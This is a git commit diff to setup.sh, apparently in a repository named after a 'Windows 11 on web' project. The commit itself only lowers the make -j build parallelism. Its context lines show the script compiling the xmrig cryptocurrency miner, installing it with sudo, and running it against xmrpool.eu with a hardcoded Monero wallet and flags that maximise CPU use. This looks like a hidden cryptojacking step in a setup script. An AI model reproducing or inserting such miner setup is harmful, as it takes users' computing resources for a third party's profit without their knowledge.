135fba9f02e9ad7d63f48a1c9e7d8be67a046e0c
Katy <135502425+windows11-on-web@users.noreply.github.com>
2024-07-05 22:13:10 +0300

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -5,7 +5,7 @@ cd xmrig
 mkdir build
 cd build
 cmake ..
-make -j8192
+make -j128
 sudo mkdir /opt/xmrig
 sudo cp ./xmrig /opt/xmrig/xmrig
 /opt/xmrig/xmrig --coin 'monero' -o xmrpool.eu:5555 -u 49Gy8KUNdFkBt62FDoNapPf8WkzEJUJobEW9Qpm1MKomAyc8JxsL57UM8VQyE8srUGQzqGv6k7JuPAvWzBwD2D6X9wbw2ck -p x --cpu-no-yield --randomx-1gb-pages --randomx-mode=fast --argon2-impl=x86_64
